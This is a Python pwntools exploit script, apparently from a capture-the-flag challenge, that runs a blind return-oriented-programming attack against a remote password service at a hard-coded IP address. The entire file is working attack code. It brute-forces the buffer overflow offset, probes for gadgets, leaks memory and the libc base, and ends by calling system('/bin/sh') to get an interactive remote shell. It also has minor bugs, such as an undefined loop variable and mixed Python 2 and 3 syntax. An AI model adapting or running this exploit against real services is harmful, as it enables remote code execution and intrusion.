#!/usr/bin/env python
from pwn import *
# python3 xpl.py OFFSET=72 STOP=0x400b4f BROP=0x400c9a PUTS=0x4007e5
# tkctf{s0met1m35_y0u_need_t0_expl0re_1n_the_darkne55!}

host = '54.161.125.246'
port = 1005

def get_overflow_length():
    logger = log.progress('Address')
    i = 1
    while True:
        try:
            context.log_level = 'info'  # suspend all logging
            logger.status("Trying: {}".format(i))
            context.log_level = 'critical'  # suspend all logging
            r = remote(host, port)
            r.recvuntil(b'Password:')
            r.sendline(b'b' * i)
            output = r.recv()
            print output
            r.close()
            if not b'Invalid Password!' in output:
                return i - 1
            else:
                i += 1
        except EOFError:
            r.close()
            return i - 1

def get_stop_gadget(offset):
    # addr = 0x400000
    addr = 0x400230
    logger = log.progress('Address')
    while True:
        try:
            context.log_level = 'info'  # suspend all logging
            logger.status("Trying: {}".format(i))
            context.log_level = 'critical'  # suspend all logging
            r = remote(host, port)
            r.recvuntil(b'Password:')
            r.sendline(b'a' * offset + p64(addr))
            content = r.recv()
            r.close()
            if b'Invalid Password!' in content:
                return addr
            addr += 1
        except EOFError:
            r.close()
            addr += 1
        except PwnlibException:
            pass

# checks if the gadget pops 6 registers
def get_brop_gadget(offset, stop_gadget, addr):
    logger = log.progress('Address')
    try:
        r = remote(host, port)
        r.recvuntil(b'Password:')
        r.sendline(b'a' * offset + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10)
        content = r.recv(timeout=0.1)
        r.close()
        return b'Invalid Password!' in content
    except EOFError:
        r.close()
        return False
    except PwnlibException:
        return get_brop_gadget(offset, stop_gadget, addr)

# checks if it is not just a false alarm
def check_brop_gadget(offset, addr):
    try:
        r = remote(host, port)
        r.recvuntil(b'Password:')
        payload = b'a' * offset + p64(addr) + b'a' * 8 * 10
        r.sendline(payload)
        content = r.recv()
        r.close()
        return False
    except EOFError:
        r.close()
        return True
    except PwnlibException:
        return check_brop_gadget(offset, addr)

def find_brop_gadget(offset, stop_gadget):
    logger = log.progress('Address')
    # addr = 0x400520
    addr = 0x400000
    while True:
        context.log_level = 'info'  # suspend all logging
        logger.status("Trying: {}".format(hex(addr)))
        context.log_level = 'critical'  # suspend all logging
        if get_brop_gadget(offset, stop_gadget, addr) and check_brop_gadget(offset, addr):
            return addr
        addr += 1

def find_puts(offset, rdi_ret, stop_gadget):
    addr = 0x400000
    # addr = 0x400000
    while True:
        try:
            log.debug("Trying: {}".format(hex(addr)))
            r = remote(host, port)
            r.recvuntil(b'Password:')
            r.sendline(b'a' * offset + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget))
            content = r.recvuntil(b'Invalid Password!')
            log.debug('content: {}'.format(content))
            if b'\x7fELF' in content and b'Invalid Password!' in content:
                return addr
            r.close()
            addr += 1
        except EOFError:
            r.close()
            addr += 1
        except PwnlibException:
            pass

def leak(offset, addr, rdi_ret, puts, stop_gadget):
    # print(hex(addr))
    try:
        r = remote(host, port)
        r.recvuntil(b'Password:')
        r.sendline(b'a' * offset + p64(rdi_ret) + p64(addr) + p64(puts) + p64(stop_gadget))
        content = r.recvuntil(b'Invalid Password!')
        r.close()
        try:
            content = content[:content.index(b'\Invalid Password!')]
        except:
            pass
        if not content:
            content = b'\x00'
        return content
    except PwnlibException:
        return leak(offset, addr, rdi_ret, puts, stop_gadget)
    except EOFError:
        r.close()
        return None


def leak_bytes(progress, offset, start, num_bytes, rdi_ret, puts, stop_gadget):
    # print(hex(start))
    addr = start
    res = b''
    while addr < (start + num_bytes):
        log.debug('Leaking: {}'.format(hex(addr)))
        if progress:
            progress.status('Leaked 0x%x bytes' % (addr - start))
        # can't leak addresses that contain \n (fgets) :(
        if b'\x0a' in p64(addr):
            data = b'\0'
        else:
            data = leak(offset, addr, rdi_ret, puts, stop_gadget)
            if data is None:
                continue
        res += data
        addr += len(data)
        # time.sleep(1)

    return res

def same_session_leak(r, offset, addr, rdi_ret, puts, main=None):
    if main is None:
        main = 0x400697
    res = b''
    while len(res) < 8:
        r.sendline(b'a' * offset + p64(rdi_ret) + p64(addr) + p64(puts) + p64(main))
        try:
            content = r.recvuntil(b'Password:')
        except EOFError:
            sleep(0.5)
            continue
        try:
            content = content[:content.index(b'\Invalid Password!')]
        except:
            pass
        if not content:
            content = b'\x00'
        res += content
        addr += len(content)
    return res

def call_function(offset, func, rdi, rdi_ret, return_addr):
    return b'a' * offset + p64(rdi_ret) + p64(rdi) + p64(func) + p64(return_addr)

if __name__ == '__main__':
    if not args.OFFSET:
        p = log.progress('Brute force search buffer overflow length')
        context.log_level = 'critical'  # suspend all logging
        offset = get_overflow_length()
        context.log_level = 'info'  # resume all logging
        p.success('Overflow starts after %d bytes' % offset)
    else:
        offset = int(args.OFFSET,0) # 72

    if not args.STOP:
        p = log.progress('Finding stop gadget')
        context.log_level = 'critical'  # suspend all logging
        stop_gadget = get_stop_gadget(offset)
        context.log_level = 'info'  # resume all logging
        p.success('Found stop gadget at 0x%x' % stop_gadget)
    else:
        stop_gadget = int(args.STOP,0) # 0x400b4f

    if not args.BROP:
        p = log.progress('Finding brop gadget')
        context.log_level = 'critical'  # suspend all logging
        brop_gadget = find_brop_gadget(offset, stop_gadget)  # it seems that there may still be false alarms
        context.log_level = 'info'  # resume all logging
        p.success('Found brop gadget at 0x%x' % brop_gadget)
    else:
        brop_gadget = int(args.BROP,0) # 0x400c9a

    pop_rdi_ret = brop_gadget + 9
    if not args.PUTS:
        log.info('Finding puts@plt')
        context.log_level = 'critical'  # suspend all logging
        puts = find_puts(offset, pop_rdi_ret, stop_gadget)
        context.log_level = 'info'  # resume all logging
        log.info('Found puts at 0x%x' % puts)
        exit(0)
    else:
        puts = int(args.PUTS,0) # 0x4007e5
        # puts = int(args.PUTS,0) # 0x4008a0
        # puts = int(args.PUTS,0) # 0x400b0c
        # puts = int(args.PUTS,0) # 0x400bd1
        # puts = int(args.PUTS,0) # 0x400bf0

    if args.LEAK_BIN:
        log.info('Leaking 0x1000 bytes starting from 0x400000')
        # context.log_level = 'critical'  # suspend all logging
        # leaked = leak_bytes(None, offset, 0x400000, 0x1000, pop_rdi_ret, puts, stop_gadget)
        # open('leaked_0x400000', 'wb').write(leaked)
        # leaked = leak_bytes(None, offset, 0x601000, 0x1000, pop_rdi_ret, puts, stop_gadget)
        # open('leaked_0x601000', 'wb').write(leaked)
        # leaked = leak_bytes(None, offset, 0x602000, 0x100, pop_rdi_ret, puts, stop_gadget)
        # open('leaked_0x602000', 'wb').write(leaked)
        # context.log_level = 'info'  # resume all logging
        log.info('Finished leaking. Wrote leaked bytes to \'./leaked\'')
        exit(0)
    # now the leaks all need to be in the same session because ASLR
    sleep(1)
    r = remote(host, port)
    r.recvuntil(b'Password:')

    # now that we have the binary, the rest is just normal rop
    log.info('Leaking GOT entry of puts')
    puts_got = 0x602018
    puts_libc = u64(same_session_leak(r, offset, puts_got, pop_rdi_ret, puts, main=stop_gadget)[:8])

    context.log_level = 'info'  # resume all logging
    log.info('Leaked puts@libc: 0x%x' % puts_libc)

    libc = ELF('libc-2.27.so')

    libc_base = puts_libc - libc.symbols['puts']
    log.info('libc: {}'.format(hex(libc_base)))
    libc.address = libc_base

    binsh = next(libc.search(b'/bin/sh\0'))
    system = libc.symbols['system']

    # call system
    log.info('Calling system(\'/bin/sh\')')
    payload = call_function(offset, system, binsh, pop_rdi_ret, stop_gadget)
    r.sendline(payload)
    r.interactive()
